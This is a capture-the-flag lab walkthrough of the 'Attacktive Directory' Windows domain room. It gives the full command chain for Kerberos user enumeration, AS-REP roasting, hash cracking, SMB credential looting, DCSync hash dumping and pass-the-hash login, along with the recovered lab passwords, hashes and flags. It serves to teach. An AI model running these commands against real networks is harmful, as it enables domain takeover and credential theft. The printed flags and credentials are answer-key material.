# HTB Attacktive Directory — Full Writeup

## Overview

Attacktive Directory is a **beginner-friendly** Windows Active Directory room on TryHackMe. The attack chain covers the most common AD exploitation techniques: Kerberos user enumeration, AS-REP Roasting, SMB credential extraction, and DCSync for full domain compromise.

## 1. Enumeration

```bash
nmap $IP -p- --open -sV -sC
```

Key open ports: 53 (DNS), 88 (Kerberos), 139/445 (SMB), 389 (LDAP), 3389 (RDP), 5985 (WinRM). Domain: `spookysec.local`.

## 2. Username Enumeration via Kerbrute

Anonymous and null sessions are restricted, so we use Kerbrute to enumerate valid domain accounts via Kerberos pre-authentication responses:

```bash
kerbrute userenum -d spookysec.local --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Valid users found: `james`, `robin`, `darkstar`, `administrator`, `backup`, `paradox`, `svc-admin` (and others found by continuing the scan).

`-d` specifies the target domain; `--dc` points to the domain controller's IP.

## 3. AS-REP Roasting

Users without Kerberos pre-authentication enabled will respond to AS-REQ requests without requiring a valid password, leaking an encrypted TGT (AS-REP hash) that can be cracked offline.

```bash
python3 GetNPUsers.py spookysec.local/ -no-pass -usersfile users.txt -dc-ip $IP
```

`svc-admin` returned a hash:

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:27eca381b11ea5...
```

## 4. Cracking the AS-REP Hash

`-m 18200` is the hashcat mode for Kerberos 5 AS-REP hashes. We use John here due to memory constraints:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep
```

**Result:** `svc-admin:management2005`

## 5. SMB Enumeration with Recovered Credentials

```bash
netexec smb $IP -u 'svc-admin' -p 'management2005' --shares
```

`--shares` lists accessible SMB shares after authenticating. A non-standard share named `backup` was found with READ access.

```bash
smbclient //$IP/backup -U 'svc-admin%management2005'
```

Inside the share:

```
ls
get backup_credentials.txt
```

Contents:

```
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Decoding from Base64:

```bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
```

**Result:** `backup@spookysec.local:backup2517860`

## 6. LDAP Enumeration

With the `backup` account we perform a full LDAP dump to map the domain:

```bash
ldapsearch -x -H ldap://$IP -b "DC=spookysec,DC=local" -D 'backup@spookysec.local' -w 'backup2517860' | grep -iE "sAMAccountName|memberOf|description"
```

- `-x` — simple (non-SASL) authentication
- `-D` — bind DN (authenticating user)
- `-b` — search base (root of the LDAP subtree to search)
- `-w` — bind password

Key finding: `a-spooks` is a member of `Domain Admins` and `Enterprise Admins` — the ultimate target.

## 7. DCSync — Dumping All Domain Hashes

The `backup` account holds DS-Replication rights, allowing it to request credential replication from the domain controller via the MS-DRSR protocol (DCSync technique):

```bash
python3 secretsdump.py spookysec.local/backup:backup2517860@$IP
```

`secretsdump.py` (impacket) calls `DrsGetNCChanges` over DRSUAPI, causing the DC to return all user hashes as if replicating to another DC.

Administrator hash extracted:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

## 8. Pass-the-Hash as Administrator

NTLM authentication accepts the hash directly — no plaintext password required:

```bash
evil-winrm -i $IP -u Administrator -H '0e0363213e37b94221497260b0bcb4fc'
```

`-H` specifies the NTLM hash instead of a password (`-p`).

## 9. Flags

```powershell
# User flag
type C:\Users\svc-admin\Desktop\user.txt.txt
# TryHackMe{K3rb3r0s_Pr3_4uth}

# Privilege escalation flag
type C:\Users\backup\Desktop\PrivEsc.txt
# TryHackMe{B4ckM3UpSc0tty!}

# Root flag
type C:\Users\Administrator\Desktop\root.txt
# TryHackMe{4ctiveD1rectoryM4st3r}
```

## Attack Chain Summary

```
Kerbrute (user enum)
    → AS-REP Roast (svc-admin hash)
    → hashcat/john (management2005)
    → SMB backup share (Base64 credentials)
    → backup:backup2517860
    → DCSync (secretsdump)
    → Administrator NTLM hash
    → Pass-the-Hash (evil-winrm)
    → Full Domain Compromise
```

## Glossary

| Term | Description |
|---|---|
| **AS-REP Roasting** | Requesting a TGT for accounts with pre-auth disabled; the encrypted response is crackable offline |
| **DCSync** | Abusing replication rights to pull all domain hashes via MS-DRSR |
| **Pass-the-Hash** | Authenticating with an NTLM hash instead of a plaintext password |
| **`-m 18200`** | Hashcat mode for Kerberos 5 AS-REP hashes |
| **`-H` (evil-winrm)** | NTLM hash authentication flag |
| **`-b` (ldapsearch)** | Base DN — root of the LDAP subtree to search |

---

